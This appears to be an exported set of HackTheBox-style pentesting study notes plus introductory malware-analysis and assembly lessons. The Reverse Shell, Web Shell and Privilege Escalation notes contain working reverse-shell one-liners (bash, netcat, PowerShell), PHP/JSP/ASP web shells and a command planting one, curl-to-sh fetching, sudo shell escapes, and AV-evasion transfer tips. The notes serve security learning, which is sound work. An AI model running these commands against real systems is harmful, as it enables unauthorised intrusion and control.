-echo\n$fg\n \n[Enter]\n[Enter]"},"HTB/FTP":{"slug":"HTB/FTP","filePath":"HTB/FTP.md","title":"FTP","links":["tags/file-transfer"],"tags":["file-transfer"],"content":"tags: file-transfer\nThe FTP server enables a client to exchange files between devices. It also enables clients to manage files remotely by sending file management commands such as delete or rename. To accomplish this, the FTP service uses two different ports to communicate between client and server.\nTo begin an FTP session, control connection requests are sent to the server using destination TCP port 21. When the session is opened, the server uses TCP port 20 to transfer the data files.\nInfo\nThe default port for ftp is 21.\nWe can login as anonymous if not restricted by the owner.\nSyntax:\nftp -p 10.129.42.253\nCommands\n\n?: To see help menu\nGet: To download files to our local system\nPut: To upload file to remote server\nExit: To exit ftp session.\ncd: Change directory\ndir: List directories\nrename: Rename a file/dir\n"},"HTB/Gobuster":{"slug":"HTB/Gobuster","filePath":"HTB/Gobuster.md","title":"Gobuster","links":["tags/web","tags/Reconnaissance","HTB/http-response-code","HTB/Wordlists","HTB/Seclist"],"tags":["web","Reconnaissance"],"content":"tags: web Reconnaissance\nGobuster is a web enumeration tool.\nDirectory/File Enumeration\nWe can use dir flag for directory enumeration.\nSyntax\n\tgobuster dir -u &lt;url&gt; -w &lt;wordlist&gt;\nIt returns various http response code for each directory which was found and can be accessed manually.\nWe can use various Wordlists for this attack such as /usr/share/wordlists/dirb/common.txt.\nDNS Subdomain Enumeration\nWe can use dns flag for subdomain enumeration. For wordlist we can use Seclist which has lists for subdomains."},"HTB/JavaScript-Deobfuscation":{"slug":"HTB/JavaScript-Deobfuscation","filePath":"HTB/JavaScript Deobfuscation.md","title":"JavaScript Deobfuscation","links":["tags/web"],"tags":["web"],"content":"web\nThe js files are minified into .min.js to hide the functions and data. To return them to their original form we have to use a deobsfuscator.\nWe can use Online Deobsfuscator such as de4js to decode the files.\nAfter deobfuscation we can see how functions are implemented, call them using console and so on."},"HTB/Logging-of-Commands":{"slug":"HTB/Logging-of-Commands","filePath":"HTB/Logging of Commands.md","title":"Logging of Commands","links":[],"tags":[],"content":"To display date and time in the terminal we can change the PS1 variable in .bashrc file as follows.\n\nBackup first\n\ncp .bashrc .bashrc.bak\n\nModify the bash\n\necho &#039;export PS1=&quot;-[\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\d\\[$(tput sgr0)\\]-\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\t\\[$(tput sgr0)\\]]-[\\[$(tput sgr0)\\]\\[\\033[38;5;214m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;196m\\]\\h\\[$(tput sgr0)\\]]-\\n-[\\[$(tput sgr0)\\]\\[\\033[38;5;33m\\]\\w\\[$(tput sgr0)\\]]\\\\$ \\[$(tput sgr0)\\]&quot;&#039; &gt;&gt; .bashrc\nScript - For Linux\nTo start logging terminal session in a file.\nscript &lt;date&gt;-&lt;start_time&gt;-&lt;name&gt;.log\nStart-Transcript - For windows\nStart-Transcript -Path &quot;C:\\Pentesting\\03-21-2021-0200pm-exploitation.log&quot;"},"HTB/Logging":{"slug":"HTB/Logging","filePath":"HTB/Logging.md","title":"Logging","links":["tags/setup"],"tags":["setup"],"content":"setup\nTo display date and time in the terminal we can change the PS1 variable in .bashrc file as follows.\n\nBackup first\n\ncp .bashrc .bashrc.bak\n\nModify the bash\n\necho &#039;export PS1=&quot;-[\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\d\\[$(tput sgr0)\\]-\\[$(tput sgr0)\\]\\[\\033[38;5;10m\\]\\t\\[$(tput sgr0)\\]]-[\\[$(tput sgr0)\\]\\[\\033[38;5;214m\\]\\u\\[$(tput sgr0)\\]@\\[$(tput sgr0)\\]\\[\\033[38;5;196m\\]\\h\\[$(tput sgr0)\\]]-\\n-[\\[$(tput sgr0)\\]\\[\\033[38;5;33m\\]\\w\\[$(tput sgr0)\\]]\\\\$ \\[$(tput sgr0)\\]&quot;&#039; &gt;&gt; .bashrc\nScript - For Linux\nTo start logging terminal session in a file.\nscript &lt;date&gt;-&lt;start_time&gt;-&lt;name&gt;.log\nStart-Transcript - For windows\nStart-Transcript -Path &quot;C:\\Pentesting\\03-21-2021-0200pm-exploitation.log&quot;"},"HTB/Metasploit":{"slug":"HTB/Metasploit","filePath":"HTB/Metasploit.md","title":"Metasploit","links":["HTB/Searchsploit"],"tags":[],"content":"Metasploit Framework (MSF) is a tool which contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets.\nTo use metasploit we need to learn the name of exploit that can be used against the service. this can be done using tools like Searchsploit.\nCommands\n1. msfconsole:\nTo start metasploit\nmsfconsole\n2. search exploit\nsearch exploit &lt;exploit&gt;\ne.g. when we search for exploit eternalblue we get output exploit/windows/smb/ms17_010_psexec along with other details.\n3. use exploit\nuse &lt;full name of exploit&gt;\ne.g. use exploit/windows/smb/ms17_010_psexec\n4. show options\nTo show config items before using an exploit. The items having required value set to zero must be set before running exploit.\n5. set &lt;option&gt;\nTo set value of a option.\nExample:\nset RHOSTS 1.1.1.1\n6. check\nTo check if exploit works without actually compromising the system."},"HTB/Nmap":{"slug":"HTB/Nmap","filePath":"HTB/Nmap.md","title":"Nmap","links":["tags/Reconnaissance","locate"],"tags":["Reconnaissance"],"content":"Reconnaissance\nParameters\n\n-sC: Run default scripts and obtain more detailed info\n-sV: Version scan\n-p-: Scan all ports\n-T:\n\n-T1: Slowest\n-T5: Physcho\n\n\n-Pn: Ping probe\n-oA: Output all to file\n \n\n\nnmap -oA outputfile 1.1.1.1\n```\nUsage\nnmap -sC -sV 1.1.1.1\nScripts\nThe syntax for running an Nmap script is `nmap —script  -p&lt;port&gt; &lt;host&gt;‘.\n1. We can locate scripts using locate:\nlocate scripts/citrix\n2. Then to run the script:\nnmap --script=&quot;my_script&quot; -p 224 1.1.1.1"},"HTB/Privilege-Escalation":{"slug":"HTB/Privilege-Escalation","filePath":"HTB/Privilege Escalation.md","title":"Privilege Escalation","links":["reverse-shell","SSH"],"tags":[],"content":"1. Enumeration Scripts\n\nPEAS\n\nLinPEAS\n\n \n\n\ncurl -L github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\t- WinPEAS\n\n# 2. SUDO\nThe `sudo` command can be used to run command to escalate privilege. We can check what `sudo` privilege we have using `sudo -l`. Most commands require user `password` but some can be ran as root without entering user password. These applications have `NOPASSWD` entry.\n```shell\n$ sudo -l\n\n    (user : user) NOPASSWD: /bin/echo\n\nWe can run that command using the shown user without entering password:\n$ sudo -u user /bin/echo Hello World!\n \n    Hello World!\nThis process can be automated using tools such as GTFObins for Linux and LOLBAS for windows.\n3. Scheduled Tasks\nThere are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:\n\nAdd new scheduled tasks/cron jobs\nTrick them to execute a malicious software\n\nThere are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:\n\n/etc/crontab\n/etc/cron.d\n/var/spool/cron/crontabs/root\n\nIf we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.\n4. Exposed Credentials\nWe can also find user passwords exposed in configuration files, logs and history files (bash_history) if we have read access to them.\n5. SSH Keys\nIf we have access to .ssh directory, we can read private keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa,  we can copy it to our machine and use the -i flag to log in with it:\nvim id_rsa\nchmod 600 id_rsa\nssh root@10.10.10.10 -i id_rsa\nCommands for specific applicaton\nPHP\nSummon bash\nsudo php -r &#039;system(&quot;/bin/bash&quot;);&#039;"},"HTB/Remote-Shells":{"slug":"HTB/Remote-Shells","filePath":"HTB/Remote Shells.md","title":"Remote Shells","links":["HTB/Reverse-Shell","HTB/Bind-Shell","HTB/Web-Shell"],"tags":[],"content":"Types of Remote Shell\n1. Reverse Shell\nConnects back to our system and gives us control through a reverse connection.\n2. Bind Shell\nWaits for us to connect to it and gives us control once we do.\n3. Web Shell\nCommunicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output."},"HTB/Reverse-Shell":{"slug":"HTB/Reverse-Shell","filePath":"HTB/Reverse Shell.md","title":"Reverse Shell","links":["Netcat"],"tags":[],"content":"Netcat Listener\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFlagDescription-lListen mode, to wait for a connection to connect to us.-vVerbose mode, so that we know when we receive a connection.-nDisable DNS resolution and only connect from/to IPs, to speed up the connection.-p 1234Port number netcat is listening on, and the reverse connection should be sent to.\nUsage\nnc -nvlp &lt;port&gt;\nReverse Shell Commands\nFor bash\nbash -c &#039;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#039;\nFor bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f\nFor Powershell\npowershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#039;10.10.10.10&#039;,1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2&gt;&amp;1 | Out-String );$sb2 = $sb + &#039;PS &#039; + (pwd).Path + &#039;&gt; &#039;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()&quot;"},"HTB/SID":{"slug":"HTB/SID","filePath":"HTB/SID.md","title":"SID","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nSID is a unique identifier of a user which is assigned when a user logs in and has all permissions assigned to it.\ne.g. S-1-5-21-2614195641-1726409526-3792725429-1006\nFinding SID\nCurrent user\nSID of current user can be found using the whoami command.\nwhoami /user\nOther users\nBut for user not logged in, we need to user Get-WmiObject Command.\n Get-WmiObject -Class Win32_UserAccount -filter &quot;name=&#039;Jim&#039;&quot;\nOR\n(Get-Localuser username).SID\nFor Security Group\nGet-WMIObject win32_group -filter &quot;name=&#039;NameOfGroup&#039;&quot;\nOR\n(Get-Localgroup $GroupName).SID"},"HTB/SMB":{"slug":"HTB/SMB","filePath":"HTB/SMB.md","title":"SMB","links":["tags/windows","tags/file-transfer","HTB/Nmap","HTB/Smbclient"],"tags":["windows","file-transfer"],"content":"windows file-transfer\nServer Message Block (SMB)\nEnumerating SMB\nNmap has many scripts for enumerating smb such as smb-os-discovery.nse\nnmap --script smb-os-discovery.nse 1.1.1.1\nShares\nSo smb allows users to share folders (hence called shares) which can be accessed and enumerated using Smbclient in linux."},"HTB/Searchsploit":{"slug":"HTB/Searchsploit","filePath":"HTB/Searchsploit.md","title":"Searchsploit","links":["HTB/Metasploit"],"tags":[],"content":"Searchsploit is a tool used to search for public vulnerabilities against a service which can then be used in Metasploit to attack the target\nInstallation\nsudo apt install exploitdb -y\nUsage\nsearchsploit &lt;application&gt; &lt;version&gt;\nExample\nsearchsploit openssh 7.2"},"HTB/Seclist":{"slug":"HTB/Seclist","filePath":"HTB/Seclist.md","title":"Seclist","links":["HTB/Wordlists"],"tags":[],"content":"Seclist is a Wordlists repository.\nInstallation\n1. Using Git\ngit clone github.com/danielmiessler/SecLists\n2. Using apt\nsudo apt install seclists -y"},"HTB/Security-Group":{"slug":"HTB/Security-Group","filePath":"HTB/Security Group.md","title":"Security Group","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nIn Windows, groups can be defined to better manage permissions of users\nCreating a security group\nNew-LocalGroup -Name &quot;Group1&quot; -Description &quot;The new group&quot;\nAdd users to the group\nAdd-LocalGroupMember -Name Group1 -Member Jim"},"HTB/Services":{"slug":"HTB/Services","filePath":"HTB/Services.md","title":"Services","links":["tags/windows"],"tags":["windows"],"content":"tags: windows\nWindows services are programs that run in the background.\nTo list services\nGet-Service | Where-Object {$_.Status -eq &quot;Running&quot;}\nOutput to a csv file\nGet-Service | Out-File -FilePath &quot;Services.txt&quot;"},"HTB/Smbclient":{"slug":"HTB/Smbclient","filePath":"HTB/Smbclient.md","title":"Smbclient","links":["HTB/SMB","tags/file-transfer"],"tags":["file-transfer"],"content":"References: SMB\nTags: file-transfer\nsmbclient is a tool to enumerate and interact with smb shares.\nFlags\n\n-N : suppress password prompt\n-L : list available shares\n\nCommand\nsmbclient -N -L \\\\\\\\1.1.1.1\nConnecting to a share\n1. Connect as a guest\nsmbclient \\\\\\\\1.1.1.1\\\\users\n2. Connect as a specific user\nsmbclient -U Bob \\\\\\\\1.1.1.1\\\\users\nCommands\n\nGet: To download files to our local system\nExit: To exit ftp session.\nls: To list dir\n"},"HTB/Transferring-Files":{"slug":"HTB/Transferring-Files","filePath":"HTB/Transferring Files.md","title":"Transferring Files","links":["tags/file-transfer","cURL"],"tags":["file-transfer"],"content":"file-transfer\n1. Using wget or cURL\nFirst we have to start a python server on directory containing the file we need to upload\npython3 -m http.server 8000\nThen we can use wget or curl to download the file from victim system\nwget http://&lt;our_ip&gt;:8000/&lt;file_name&gt;\ncurl http://&lt;our_ip&gt;:8000/&lt;file_name&gt; -o &lt;output_file_name&gt;\n2. Using scp\nIf we have obtained ssh user credentials on the remote host. We can do so as follows:\nscp &lt;our_filename&gt; user@remotehost:/dir/&lt;out_filename&gt;\n3. Using Base64\nTo bypass firewall and av we can encode our file before sending and decode on victim system.\nFor example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:\nbase64 shell -w 0\nNow, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:\necho &lt;encoded_string&gt; | base64 -d &gt; shell"},"HTB/User-Creation":{"slug":"HTB/User-Creation","filePath":"HTB/User Creation.md","title":"User Creation","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nCreate a new user\nNew-LocalUser -Name &#039;Bob&#039; -NoPassword\nAssign user to a Security Group\nAdd-LocalGroupMember -Name Group1 -Member Bob"},"HTB/Web-Shell":{"slug":"HTB/Web-Shell","filePath":"HTB/Web Shell.md","title":"Web Shell","links":["HTB/Webroot","cURL"],"tags":[],"content":"A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.\nWriting a Web Shell\nWe need to write our web shell that would take our command through a GET request, execute it, and print its output back.\nSome common web shells:\nFor php\n&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;\nFor jsp\n&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;\nFor asp\n&lt;% eval request(&quot;cmd&quot;) %&gt;\nUploading a web shell\nWe need to have our web shell in the remote server’s Webroot to execute it. We can either upload our shell such as shell.php to the server using file upload vulnerability or directly write our shell using command execution vulnerability\nWriting a web shell\nFor apache Webroot\necho &#039;&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&#039; &gt; /var/www/html/shell.php\nAccessing Web shell\n1. Visiting the webpage\nTo run a command we can visit our shell.php page and use ?cmd=id to execute id command.\nExample url: http://SERVER_IP:PORT/shell.php\n2. Using cURL\ncurl http://SERVER_IP:PORT/shell.php\nGreatness of Web Shell\n\nIt can bypass any firewall (uploading shell might trigger tho) as we are using existing port to run command using existing service to summon a shell.\nEven if host is rebooted the shell is intact.\n\nSadness of Web Shell\n\nIts easy to detect as any sane person/antivirus can notice a shell.php in root directory.\nIts is not interactive as we need to send requests for command each time tho we can automate and make it semi automatic but its not as good.\n"},"HTB/Webroot":{"slug":"HTB/Webroot","filePath":"HTB/Webroot.md","title":"Webroot","links":[],"tags":[],"content":"The following are the default webroots for common web servers:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWeb ServerDefault WebrootApache/var/www/html/Nginx/usr/local/nginx/html/IISc:\\inetpub\\wwwroot\\XAMPPC:\\xampp\\htdocs\\"},"HTB/Wordlists":{"slug":"HTB/Wordlists","filePath":"HTB/Wordlists.md","title":"Wordlists","links":["HTB/Seclist"],"tags":[],"content":"Default Wordlist\nDirectory: /usr/share/wordlist\nTree\nExternal List\n1. Seclist"},"HTB/http-codes":{"slug":"HTB/http-codes","filePath":"HTB/http codes.md","title":"http codes","links":[],"tags":[],"content":"1. 200 – Successful\n\nMeaning: The request was successful, and the server returned the requested resource.\nCommon Use Cases:\n\nSuccessful loading of a web page.\nAPI request returning valid data.\n\n\n\n\n2. 301 – Redirect\n\nMeaning: The requested resource has been permanently moved to a new URL.\nCommon Use Cases:\n\nUsed in SEO to redirect old URLs to new ones.\nEnsures users and search engines access the correct location.\n\n\n\n\n3. 403 – Forbidden\n\nMeaning: The server understood the request but refuses to authorize it.\nCommon Use Cases:\n\nUser tries to access a restricted file or directory.\nMissing permissions or access credentials.\n\n\n\n\n4. 404 – Not Found\n\nMeaning: The requested resource could not be found on the server.\nCommon Use Cases:\n\nBroken links or deleted resources.\nMistyped URLs.\n\n\n\n\n5. 500 – Internal Server Error\n\nMeaning: The server encountered an error and could not complete the request.\nCommon Use Cases:\n\nServer misconfiguration or malfunction.\nBug in server-side code.\n\n\n\n\n6. 302 – Found (Temporary Redirect)\n\nMeaning: The requested resource is temporarily located at a different URL.\nCommon Use Cases:\n\nRedirecting users to a different page temporarily during maintenance.\n\n\n\n\n7. 400 – Bad Request\n\nMeaning: The server could not understand the request due to invalid syntax.\nCommon Use Cases:\n\nAPI call with incorrect parameters or malformed JSON.\n\n\n\n\n8. 401 – Unauthorized\n\nMeaning: The request requires user authentication.\nCommon Use Cases:\n\nAccessing pages or APIs requiring login credentials.\n\n\n\n\n9. 502 – Bad Gateway\n\nMeaning: The server, acting as a gateway or proxy, received an invalid response from an upstream server.\nCommon Use Cases:\n\nServer overload or upstream server issues.\n\n\n\n\n10. 503 – Service Unavailable\n\nMeaning: The server is temporarily unable to handle the request.\nCommon Use Cases:\n\nServer maintenance or high traffic.\n\n\n"},"HTB/http-response-code":{"slug":"HTB/http-response-code","filePath":"HTB/http response code.md","title":"http response code","links":[],"tags":[],"content":"1. 200 – Successful\n\nMeaning: The request was successful, and the server returned the requested resource.\nCommon Use Cases:\n\nSuccessful loading of a web page.\nAPI request returning valid data.\n\n\n\n\n2. 301 – Redirect\n\nMeaning: The requested resource has been permanently moved to a new URL.\nCommon Use Cases:\n\nUsed in SEO to redirect old URLs to new ones.\nEnsures users and search engines access the correct location.\n\n\n\n\n3. 403 – Forbidden\n\nMeaning: The server understood the request but refuses to authorize it.\nCommon Use Cases:\n\nUser tries to access a restricted file or directory.\nMissing permissions or access credentials.\n\n\n\n\n4. 404 – Not Found\n\nMeaning: The requested resource could not be found on the server.\nCommon Use Cases:\n\nBroken links or deleted resources.\nMistyped URLs.\n\n\n\n\n5. 500 – Internal Server Error\n\nMeaning: The server encountered an error and could not complete the request.\nCommon Use Cases:\n\nServer misconfiguration or malfunction.\nBug in server-side code.\n\n\n\n\n6. 302 – Found (Temporary Redirect)\n\nMeaning: The requested resource is temporarily located at a different URL.\nCommon Use Cases:\n\nRedirecting users to a different page temporarily during maintenance.\n\n\n\n\n7. 400 – Bad Request\n\nMeaning: The server could not understand the request due to invalid syntax.\nCommon Use Cases:\n\nAPI call with incorrect parameters or malformed JSON.\n\n\n\n\n8. 401 – Unauthorized\n\nMeaning: The request requires user authentication.\nCommon Use Cases:\n\nAccessing pages or APIs requiring login credentials.\n\n\n\n\n9. 502 – Bad Gateway\n\nMeaning: The server, acting as a gateway or proxy, received an invalid response from an upstream server.\nCommon Use Cases:\n\nServer overload or upstream server issues.\n\n\n\n\n10. 503 – Service Unavailable\n\nMeaning: The server is temporarily unable to handle the request.\nCommon Use Cases:\n\nServer maintenance or high traffic.\n\n\n"},"HTB/ssh":{"slug":"HTB/ssh","filePath":"HTB/ssh.md","title":"ssh","links":[],"tags":[],"content":"Secure shell"},"Malware-Analysis/Analyzing-Imports--and--Exports":{"slug":"Malware-Analysis/Analyzing-Imports--and--Exports","filePath":"Malware Analysis/Analyzing Imports & Exports.md","title":"Analyzing Imports & Exports","links":[],"tags":[],"content":"What is Imports and Exports?\nImports refers to the functions imported by a Windows executable from DLL.\nExports refers to all functions exported by a given DLL.\nSignificance of Imports and Exports in Static Malware Analysis\nIn static malware analysis of Windows executable files, examining imports and exports is crucial. This is because insights about the behavior of the malware can be gained based on DLL files and their contained functions. For example, information about certain DLLs is demonstrated in the visual below:\n\nThe DLLs seen in the above image are likely to be used by the malware. For example, the “User32.dll” file is a DLL used for performing operations that require user interaction. Clicking on the displayed icons and locking the screen are examples of actions that can be performed using this DLL.\nViewing Imports and Exports\nThere are several tools available to view imports and exports. In this section of the training, the “PE Studio” tool is used to view the imports and exports of Windows malware files.\nYou can access the “PE Studio” tool at the following address:\nPE Studio: www.winitor.com/download \nLet’s examine the imports of malware:\n\nThe image above shows which functions are imported from which DLL. The tasks performed by these functions provide information about the malware’s behavior. Similarly, exports can also be examined.\n\nSince this malware does not have any exports, the PE Studio tool has provided an empty output as shown above."},"Malware-Analysis/Assembly-KeyNotes":{"slug":"Malware-Analysis/Assembly-KeyNotes","filePath":"Malware Analysis/Assembly KeyNotes.md","title":"Assembly KeyNotes","links":[],"tags":[],"content":"\n\nLEA (Load Effective Address)\nLoads  the address into register instead of the value stored in the address.\n\nHere, the address of variable in the stack are loaded into rdx and rax first then moved to rsi and rdi.\n\n\nArguments to a function are passed through rsi and rdi.\n\n\n"},"Malware-Analysis/Basic-Concepts":{"slug":"Malware-Analysis/Basic-Concepts","filePath":"Malware Analysis/Basic Concepts.md","title":"Basic Concepts","links":[],"tags":[],"content":"What is Compiling and Decompiling?\nCompiling is the process that enables the source code of the programming language to run on the target system. A compiled source code transforms into binary type machine code. The extension of such files on Windows is “.exe”.\n\nDecompiling is the process of obtaining the source code from the executable file. Decompiling cannot be done easily in every programming language because software manufacturers do not want the source codes of their software to be revealed. In order for the source code not to be revealed out through decompiling, vendors take advantage of different features of the programming languages and some other techniques while developing the software. This makes it much more difficult to implement the reverse engineering processes of the software.\nAs an example, the executable file will be decompiled in order to obtain the source code of an executable file written in C# programming language without anti-reversing techniques applied below. Some of the tools that can be used for this are:\n\nILSpy - github.com/icsharpcode/ILSpy \ndotPeek - www.jetbrains.com/decompiler/\n.NET Reflector - www.red-gate.com/products/dotnet-development/reflector/ \nJustDecompile - github.com/telerik/justdecompileengine \n\nC# Binary Decompile Example with ILSpy Tool\nWe will use the “ILSpy” tool in this example to decompile the executable file written in C# programming language. This is a tool that runs on Windows systems and has a graphical user interface (GUI). You can access the non-installation file of the ILSpy tool using the link below:\nILSpy: github.com/icsharpcode/ILSpy/releases/download/v8.0-preview3/ILSpy_binaries_8.0.0.7246-preview3.zip \nNote: “.NET 6.0” must be installed on your Windows system in order to be able use the ILSpy tool on the link above. “ILSpy” and “.NET 6.0” installation files are located in the “CourseFiles” directory in the Linux system, which is included in the following parts of the training.\nLet’s start with the example:\n\nNote: You can access the “LetsDefend.exe” file in the example on the “CourseFiles” directory in the Linux system, which is included in the following parts of the training.\nLet’s run the “LetsDefend.exe” file shown in the image above.\n\nThe window you see above pops open when the program is run. Let’s see what the program does:\n\nAs seen in the image above, the program shows an image when the “Click Me” button is clicked. So, let’s open the “ILSpy” tool to reveal the source code of the program with the decompile process to be able to reveal how this happens or through what code it does happen.\n\nThe window you see above will pop open when the ILSpy tool is run.\n\nWe can upload our file to the program using “File → Open” option.\n\nAs you can see the image above, the decompile process starts and after the program is uploaded into the ILSpy tool. We can use the navigation menu on the left to see what happens when the button is clicked through the source code:\n\nAs seen in the source code in the image above, the invisible picture box becomes visible when the button is clicked.\nWe have obtained the source code of the program which was written in C# language with the help of the ILSpy tool and the exact function of the button in the code was revealed.\nWhat is Assembler and Disassembler?\nAssembler is a compiler that converts the source code written in assembly language to machine code.\n\n“The Netwide Assembler (NASM)”, is an example of an assembler:\nThe Netwide Assembler (NASM): www.nasm.us/\nDisassembler is a tool that helps acquire the assembly code of the executable binary file.\n\nExamples of disassembler include:\n\nIDA Pro (Windows &amp; Linux) - www.hex-rays.com/ida-pro/ \nHopper Disassembler (Linux) - www.hopperapp.com/ \nBinary Ninja - binary.ninja/ \nObjdump (Linux) - man7.org/linux/man-pages/man1/objdump.1.html \n\nWhat is Debugging and Debugger?\nDebugging is the in-depth analysis process in order to see the detailed and step-by-step operations of the programs during operation. Debugging can be done for many different purposes. For example, it can be used to test the program. If debugging is applied within the scope of reverse engineering, the aim is to learn the flow of the program and to reveal its processes. Debugging can be done in high-level programming languages such as C#, as well as in low-level languages such as Assembly.\nSpecial programs are needed for debugging that are also known as “debuggers”. For example, a debugger can be used in the “Visual Studio” software for debugging C# source codes. There are different debugger tools specific to each operating system in order to perform debugging at the Assembly language level. Below are some of the debuggers:\n\nOllyDbg (Windows) - www.ollydbg.de/ \nImmunityDebugger (Windows) - www.immunityinc.com/products/debugger/ \nGDB (Linux) - www.sourceware.org/gdb/ \nIDA Pro (Windows &amp; Linux) - hex-rays.com/ida-pro/ \nX64dbg (Windows) - x64dbg.com/ \nWindbg (Windows) - learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools\n"},"Malware-Analysis/C-Binary-Decompiling-with-Ghidra":{"slug":"Malware-Analysis/C-Binary-Decompiling-with-Ghidra","filePath":"Malware Analysis/C Binary Decompiling with Ghidra.md","title":"C Binary Decompiling with Ghidra","links":[],"tags":[],"content":"In the example in this section, the Ghidra tool will be run on a Linux system and the “helloworld” executable file in the previous examples will be decompiled.\nFirst, let’s open the Ghidra tool:\nCommand: `./ghidraRun\n\nAs shown in the image above, the ghidra tool will open when the command at the top of the image is applied on the command line in the directory where the ghidra file is located.\n\n\nGhidra will first ask you for a user agreement that you must confirm when first opened. Continue with the “I Agree” option.\n\nIn order to work on the Ghidra tool, a new project must be opened with “File → New Project”.\n\nSelect the project type and continue with “Next”.\n\nBrowse the path for the project directory, name the project and continue with “Finish”.\n\nThe part that should be used in Ghidra for decompile process is the “CodeBrowser” section. Open it up as shown in the image above.\n\nAfter the CodeBrowser runs import the executable file with the “File → Import File” option in order to start the decompile process.\n\nSelect the executable file and continue with “Select File To Import”.\n\nContinue with “OK” in the above window where some information about the file to be imported is displayed.\n\nContinue with the “Yes” option.\n\nYou are presented with some details about the analysis options. Leave it as it is in its default state and continue with “Analyze”.\n\nYou are presented with some details about the file and now, continue with “OK”. After all these decompile process window will pop open and details about the process is displayed as you can see in the image below: \n\nIn this window, you can see the functions under the “Functions” directory in the “Symbol Tree” section on the left menu. It will be enough to click on the “main” button see the decompiled state of the function in the decompile area on the right. A short-decompiled output was displayed for the “Helloworld” program. Larger programs are likely to have more functions and therefore more decompiled output.\nWith the example above, the source code of the executable file written in C programming language was accessed using the ghidra tool."},"Malware-Analysis/CPU-Instructions":{"slug":"Malware-Analysis/CPU-Instructions","filePath":"Malware Analysis/CPU Instructions.md","title":"CPU Instructions","links":[],"tags":[],"content":"CPU Instructions\nInstructions are the commands in the assembly language. There are a lot different type of instructions for different tasks and purposes. Some may have similar duties. It is vital to know the instructions in order to follow the program flow in the assembly language. Below are some of the instructions and their tasks:\nArithmetic Instructions\nArithmetic instructions are those that perform arithmetic operations between operands. For example, the four arithmetic operations are examples of such transactions.\nADD\nThe “ADD” is the instruction that enables to perform the addition. For example:\n`ADD    ESP, 0x8\nWith the above instruction, 8 is added to the value of the ESP register.\nSUB\nThe “SUB” is the instruction that enables the subtraction. For example:\n`SUB    ESP, 0x4\nWith the above instruction, 4 is subtracted from the value of the ESP register.\nMUL\nThe “MUL” is the instruction that enables multiplication to be performed.\nDIV\nThe “DIV” is the instruction that enables division to be performed.\nINC\nThe “INC” is an instruction that allows you to increment the value of the operand by 1. For example:\n`INC    EBX\nWith the above instruction, the value of the EBX register is incremented by 1.\nDEC\nThe “DEC” is an instruction that allows you to decrement the value of the operand by 1. For example:\n`DEC    EBX\nWith the above instruction, the value of the EBX register is decremented by 1.\nBranch Instructions\nBranch instructions are those that performs the comparison and/or branching. They are vital with respect to follow the program flow in the assembly language. Below are some of these instructions:\nJMP\nThe “JMP” is the instruction that allows branching unconditionally. It takes the memory address as an operand. For example:\n`JMP    0x56556020\nWith the above instruction, the program flow branches to the memory address given as operand (branching).\nJZ/JE\nThe “JZ” and “JE” instructions are among the conditional branching instructions. They stand for: \nJZ = Jump if Zero\nJE = Jump if Equal\nJE and JZ instructions take memory address as operand. For example:\n`JE     0x5555555551b5 &lt;main+277&gt;\nWith the above instruction, the condition for branching to the memory address in the operand is that the zero flag is set to “1” in the form of “ZF=1”.\nJNZ/JNE\nThe “JNZ” and “JNE” instructions are also among the conditional branching instructions. They stand for: \nJNZ = Jump if not Zero\nJNE = Jump if not Equal\nJNE ve JNZ instructions take memory address as operand. For example:\n`JNE    0x565561e7 &lt;main+78&gt;\nThe condition for branching to the memory address in the operand with the above instruction is that the zero flag is set to “0” in the form of “ZF=0”.\nCALL\nThe “CALL” instruction is the instruction used for function call. It takes a function address as an operand. For example:\n`CALL   0x56556199 \nWith the above instruction, the function named “function1” is called. There are 2 basic operations with this instruction:\n\n\nThe address of the instruction after the CALL instruction in the program flow is pushed to the stack (Return address)\n\n\nThe value of the EIP register is set as the function address, so that the program flow branches to the corresponding function.\n\n\nCMP\nThe “CMP” instruction is used for comparison operations. Takes 2 values to compare as operands. For example:\n`CMP    EDX, EAX\nThe above instruction compares the EAX and EDX registers. Depending on the result of the comparison, “Zero Flag(ZF)” and “Carry Flag(CF)” may be changed. The below table shows the conditions that will cause these changes.\n\nData Transfer Instructions\nThere are many data transfer instructions in assembly language that are used for different purposes. Some of these are listed below:\nMOV\nThe “MOV” is the most basic data transfer instruction used to assign a value to a register or to an address in the memory. For example:\n`MOV    EAX, 0x0\nWith the above instruction, the value “0” (zero) is assigned to the EAX 